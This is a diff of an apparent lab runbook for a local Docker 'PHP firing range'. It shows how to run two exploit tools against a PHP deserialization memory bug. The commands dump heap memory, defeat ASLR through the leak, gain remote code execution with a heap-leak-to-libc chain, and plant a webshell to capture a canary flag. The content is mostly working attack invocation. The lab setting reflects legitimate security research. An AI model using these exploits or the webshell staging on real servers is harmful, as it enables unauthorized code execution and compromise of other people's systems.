@@ -43,31 +43,33 @@ curl -s -X POST http://127.0.0.1:8088/index.php --data-urlencode 'cook=s:2:"ok";
 - 8083 surface lab (CVE-2026-109618 OOM mile), 8181 shakedown,
   8082/8091/8056 version surface
 
-## 3. Run the exploit (phpbleed-bastet.py)
-One stream per container at a time (the tool takes a flock; a second
-concurrent stream refuses and exits). Restart for a fresh heap between
-full attempts: `docker restart php-firing-range-phpbleed-1`
+## 3. Run the tools (refactor 2026-10-24: php2shell owns RCE, phpbleed bleeds)
+One stream per container at a time (both tools take the SAME per-target
+flock; a second concurrent stream - from either tool - refuses and exits).
+Restart for a fresh heap between full attempts:
+`docker restart php-firing-range-phpbleed-1`
 
-Bleed (memory dump over the serialize echo channel):
+Bleed (memory dump over the serialize echo channel) - phpbleed:
 ```
 python3 phpbleed-bastet.py dump http://127.0.0.1:8088/index.php \
     --pages 8 --read-len 0x100000 --out /tmp/heap.dump
 # ~1MB/16 requests; window = worker heap around the leaked arena
 ```
-Classify a pointer / find the DSO base via the leak:
+Classify a pointer / find the DSO base via the leak - phpbleed:
 ```
 python3 phpbleed-bastet.py probe http://127.0.0.1:8088/index.php
 ```
 RCE, zero knowledge (no addresses needed - ASLR is defeated by the leak;
-chain: heap leak -> libphp scan -> .gnu_hash -> GOT/libc -> ce -> spray):
+chain: heap leak -> libphp scan -> .gnu_hash -> GOT/libc -> ce -> spray) -
+php2shell, dispatch route (moved from phpbleed 2026-10-24):
 ```
-python3 phpbleed-bastet.py id http://127.0.0.1:8088/index.php --cmd 'id>/tmp/x'
+python3 php2shell-bastet.py id http://127.0.0.1:8088/index.php --cmd 'id>/tmp/x'
 docker exec php-firing-range-phpbleed-1 cat /tmp/x
 # expect: uid=33(www-data)   ("no response" on R-7 is normal: worker dies)
 ```
-Full score - staged webshell + canary fetch:
+Full score - staged webshell + canary fetch - php2shell dispatch:
 ```
-python3 phpbleed-bastet.py shell http://127.0.0.1:8088/index.php \
+python3 php2shell-bastet.py shell http://127.0.0.1:8088/index.php \
     --webshell r.php --fetch /CANARY
 # banner ends: CANARY CAPTURED :: FLAG{phpbleed:...}
 # independent verification:
@@ -77,6 +79,10 @@ docker exec php-firing-range-phpbleed-1 rm -f /var/www/html/r.php /var/www/html/
 ```
 Legacy fast path (repeat shots, same container, offsets already known):
 `id` mode plus `--ce 0x... --system 0x... --spray 0x...` (skip re-derivation).
+Other php2shell routes: `--route groom` = the CVE-2026-109618/619 two-update
+path (legacy single-positional invocation, still needs heap tuning);
+`--route serializer` = va-borrowed fake-ps_serializer design (EXPERIMENTAL,
+--dry gated, needs --bias + --ps-serializer-off; see TODO VA #3).
 
 ## 4. The 618 lab (:8083) is a different bug (CVE-2026-109618)
 Trigger (DoS-grade, vendor phpt shape) works with the tooling above, but
